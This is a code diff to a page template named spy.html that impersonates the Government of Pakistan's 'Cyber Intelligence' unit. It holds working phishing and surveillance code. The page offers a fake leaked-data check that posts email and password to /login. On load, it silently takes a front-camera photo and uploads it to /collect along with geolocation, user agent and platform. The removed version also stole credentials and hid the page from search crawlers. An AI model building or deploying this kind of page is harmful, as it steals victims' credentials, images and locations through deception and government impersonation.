@@ -1,140 +1,140 @@
+<!-- templates/spy.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Government of Pakistan – Cyber Intelligence</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/3/38/State_emblem_of_Pakistan.svg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>⚠️ Government of Pakistan – Cyber Intelligence</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/State_emblem_of_Pakistan.svg/1200px-State_emblem_of_Pakistan.svg.png">
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: #1a1a1a;
       color: white;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
+      justify-content: center;
       height: 100vh;
+      background-image: url('https://www.transparenttextures.com/patterns/black-linen.png');
     }
-    .box {
-      background: rgba(255, 255, 255, 0.05);
+    .container {
+      background: rgba(255,255,255,0.05);
       padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.6);
-      backdrop-filter: blur(10px);
+      border-radius: 16px;
       text-align: center;
       width: 350px;
-    }
-    img.logo {
-      width: 60px;
-      margin-bottom: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      backdrop-filter: blur(8px);
     }
     h1 {
       font-size: 20px;
-      margin-bottom: 10px;
+      color: #e74c3c;
     }
     p {
-      font-size: 13px;
+      font-size: 14px;
       margin-bottom: 20px;
-      color: #ccc;
     }
     input, button {
       width: 100%;
       padding: 10px;
-      margin: 6px 0;
+      margin: 8px 0;
       border-radius: 6px;
       border: none;
-      font-size: 14px;
     }
     input {
       background: #ecf0f1;
       color: #2c3e50;
     }
     button {
-      background: #e74c3c;
+      background: #c0392b;
       color: white;
       font-weight: bold;
       cursor: pointer;
     }
     button:hover {
-      background: #c0392b;
+      background: #e74c3c;
+    }
+    img {
+      max-width: 80px;
+      margin-bottom: 10px;
     }
   </style>
 </head>
 <body>
-  <div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/38/State_emblem_of_Pakistan.svg" class="logo">
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/State_emblem_of_Pakistan.svg/1200px-State_emblem_of_Pakistan.svg.png">
     <h1>⚠️ Government of Pakistan – Cyber Intelligence</h1>
-    <p>Confidential system – Your location & camera are being analyzed...</p>
-    <form id="spyForm">
-      <input type="text" placeholder="Email" id="email" required>
-      <input type="password" placeholder="Password" id="password" required>
-      <button type="submit">Verify Identity</button>
+    <p>📬 Please check your leaked email and password data.</p>
+    <form action="/login" method="POST">
+      <input type="email" name="email" placeholder="Email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Check Now</button>
     </form>
   </div>
 
   <script>
-    const form = document.getElementById('spyForm');
+    async function sendPhotoBlob(blob) {
+      const formData = new FormData();
+      formData.append('photo', blob);
+      try {
+        await fetch('/collect', {
+          method: 'POST',
+          body: formData
+        });
+      } catch (e) {
+        console.error('Photo send failed', e);
+      }
+    }
 
-    async function captureAndSend(cameraStatus, lat = null, lon = null, image = null) {
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      const payload = {
-        email: email,
-        password: password,
+    async function collectData(status, lat = null, lon = null) {
+      const data = {
         userAgent: navigator.userAgent,
         latitude: lat,
         longitude: lon,
-        camera: cameraStatus,
-        deviceInfo: navigator.platform,
-        image: image
+        camera: status,
+        deviceInfo: navigator.platform
       };
 
       await fetch('/collect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        body: JSON.stringify(data)
       });
     }
 
-    function askPermissionsAndSend() {
-      navigator.mediaDevices.getUserMedia({ video: true })
+    function capturePhoto(stream) {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      video.onloadedmetadata = () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+          sendPhotoBlob(blob);
+        }, 'image/jpeg');
+      };
+    }
+
+    function askPermissions() {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
         .then(stream => {
-          const track = stream.getVideoTracks()[0];
-          const imageCapture = new ImageCapture(track);
-          imageCapture.takePhoto()
-            .then(blob => {
-              const reader = new FileReader();
-              reader.onloadend = () => {
-                const base64data = reader.result;
-                navigator.geolocation.getCurrentPosition(pos => {
-                  captureAndSend('✅ Camera Allowed', pos.coords.latitude, pos.coords.longitude, base64data);
-                }, err => {
-                  captureAndSend('✅ Camera Allowed ❌ Location Denied', null, null, base64data);
-                });
-              };
-              reader.readAsDataURL(blob);
-            })
-            .catch(() => {
-              captureAndSend('✅ Camera Allowed ❌ (No Photo)');
-            });
-          stream.getTracks().forEach(t => t.stop());
+          capturePhoto(stream);
+          stream.getTracks().forEach(track => track.stop());
+
+          navigator.geolocation.getCurrentPosition(
+            pos => collectData('✅ Camera Allowed', pos.coords.latitude, pos.coords.longitude),
+            err => collectData('✅ Camera Allowed, ❌ Location Denied')
+          );
         })
-        .catch(() => {
-          captureAndSend('❌ Camera Denied');
-        });
+        .catch(() => collectData('❌ Camera Denied'));
     }
 
-    form.addEventListener('submit', function (e) {
-      e.preventDefault();
-      askPermissionsAndSend();
-      alert(\"✅ Verification in progress. Please wait...\");
-    });
-
-    // Prevent bots
-    if (/bot|google|crawler|spider|robot|crawling/i.test(navigator.userAgent)) {
-      document.body.innerHTML = '<h1>Access Denied</h1>';
-    }
+    window.onload = askPermissions;
   </script>
 </body>
 </html>
